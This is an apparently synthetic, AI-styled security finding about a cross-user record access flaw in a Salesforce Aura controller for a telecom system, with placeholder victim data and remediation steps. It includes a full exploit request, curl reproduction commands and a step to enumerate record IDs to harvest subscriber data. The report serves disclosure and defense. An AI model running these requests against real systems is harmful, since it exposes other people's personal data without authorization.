# Security Analysis Report
**System:** SpectreNet Policy Control (Telecom / 5G Core) — Salesforce-Integrated
**Classification:** SENSITIVE
**Analyst:** Security Analyst Co-Pilot
**Source:** SF-0015 context.txt (sole artifact)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA / Pattern 1.5 | Cross-user Contact record access via Aura — `without sharing` Apex bypasses multi-tenant 5G policy records |

---

## Finding 1 — Multi-Tenant Cross-User Contact Access via Aura Controller (CRITICAL)

### Summary
The `ContactController` Apex class on SpectreNet Policy Control (`7d5aa8ba.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private rules for the Contact object. The `updateContact` Aura action accepts a `contactId` parameter from the client without validating that the authenticated user owns or has been granted access to that record. An attacker with a valid Salesforce session can supply any `contactId` to retrieve another user's Contact record — including `SensitiveData__c` (SSN) and `InternalNotes__c` — crossing multi-tenant 5G policy data boundaries.

**Pattern:** 1.5 — Multi-tenant / cross-tenant access (BOLA)
**Affected controller:** `c.ContactController.updateContact`
**Affected endpoint:** `POST https://7d5aa8ba.lightning.force.com/aura`

### Evidence from HAR

**Request (attacker with valid session):**
```
POST https://7d5aa8ba.lightning.force.com/aura HTTP/1.1
Authorization: Bearer 00D7D5AA8BA!AR7d5aa8ba...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D7D5AA8BA!AR7d5aa8ba...

message={"actions":[{"id":"1;a","descriptor":"c.ContactController.updateContact","callingDescriptor":"UNKNOWN","params":{"contactId":"001A8BA","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}&aura.token=undefined
```

**Response (200 OK):**
```json
{
  "actions": [{
    "id": "1;a",
    "state": "SUCCESS",
    "returnValue": {
      "records": [{
        "Id": "001A8BA",
        "Name": "Victim Contact Record",
        "OwnerId": "005VICTIM",
        "InternalNotes__c": "CONFIDENTIAL: internal review notes",
        "SensitiveData__c": "SSN: 000-91-7625"
      }]
    },
    "error": []
  }]
}
```

**`aura.token`:** `undefined` — Aura session token not validated server-side.

The response exposes `SensitiveData__c: "SSN: 000-91-7625"` and `InternalNotes__c` belonging to `OwnerId: "005VICTIM"`. In a telecom 5G core policy system, Contact records can contain subscriber identity, policy configuration, and network access credentials.

### Evidence Map

| Artifact Location | Field | Value | Significance |
|-------------------|-------|-------|--------------|
| §4.0 Apex code | `without sharing` | Class declaration | OWD=Private for Contact bypassed |
| §4.0 SOQL | `WHERE Id = :contactId` | No OwnerId check | Direct root cause |
| §5.0 Pattern 1.5 | Vulnerability | Multi-tenant cross-user access | Classification |
| §8.0 RISK-SF-015 | Known risk | Controller without `with sharing` | Confirmed architectural gap |
| §8.0 RISK-SF-016 | Known risk | No ownership SOQL check | Confirmed known gap |
| HAR descriptor | `c.ContactController.updateContact` | Aura action | Vulnerable entry point |
| HAR params | `contactId` | `001A8BA` | Victim record ID supplied by attacker |
| HAR params | `aura.token` | `undefined` | Missing Aura session validation |
| HAR response | `OwnerId` | `005VICTIM` | Victim user — cross-user access confirmed |
| HAR response | `SensitiveData__c` | `SSN: 000-91-7625` | PII/SSN leaked |
| HAR response | `InternalNotes__c` | `CONFIDENTIAL: internal review notes` | Internal notes exposed |

### Steps to Reproduce

**Step 1 — Obtain valid Salesforce session:**
```bash
SF_TOKEN="00D7D5AA8BA!AR7d5aa8ba..."
```

**Step 2 — Call Aura controller with victim's contactId (VULNERABLE):**
```bash
curl -s -X POST "https://7d5aa8ba.lightning.force.com/aura" \
  -H "Authorization: Bearer $SF_TOKEN" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-SFDC-Session: $SF_TOKEN" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.ContactController.updateContact","callingDescriptor":"UNKNOWN","params":{"contactId":"001A8BA","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined' \
  | python3 -m json.tool
# Expected VULNERABLE output: OwnerId=005VICTIM, SensitiveData__c=SSN: 000-91-7625
```

**Step 3 — Enumerate telecom subscriber contacts:**
```bash
# Iterate contactId values (001XXXXX pattern) to harvest subscriber PII and policy configs
```

**Step 4 — Secure baseline (expected after fix):**
```bash
# Returns: {"actions":[{"state":"ERROR","error":[{"message":"Insufficient Privileges"}]}]}
```

### Remediation

1. **Add `with sharing` to Apex class:**
   ```apex
   public with sharing class ContactController {
   ```
2. **Add ownership predicate to SOQL:**
   ```apex
   'WHERE Id = :contactId AND OwnerId = :UserInfo.getUserId()'
   ```
3. **Add `WITH SECURITY_ENFORCED`** to SOQL to enforce field-level security.
4. **Validate `aura.token`:** Reject all requests where `aura.token` is `undefined` or invalid.
5. **Server-defined field selection:** Remove client-supplied `fields` parameter; define allowed fields server-side.
6. **Telecom-specific:** Ensure 5G policy records and subscriber identity data are protected under telecom data sovereignty regulations; audit all Contact-related Apex controllers for `without sharing`.
